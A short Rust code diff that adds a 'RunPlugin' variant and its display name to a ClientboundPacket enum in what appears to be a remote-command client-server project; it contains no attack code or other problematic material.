@@ -128,6 +128,7 @@ pub enum ClientboundPacket {
     UploadFile(String, FileData),
 
     ExecutePlugin(String, Vec<u8>),
+    RunPlugin(String, Box<ClientboundPacket>),
 }
 
 impl Packet for ClientboundPacket {
@@ -183,6 +184,7 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::ExecuteFile(_) => "Execute File",
             ClientboundPacket::UploadFile(_, _) => "Upload File",
             ClientboundPacket::ExecutePlugin(_, _) => "Execute Plugin",
+            ClientboundPacket::RunPlugin(_, _) => "Run Plugin",
         }
     }
 }
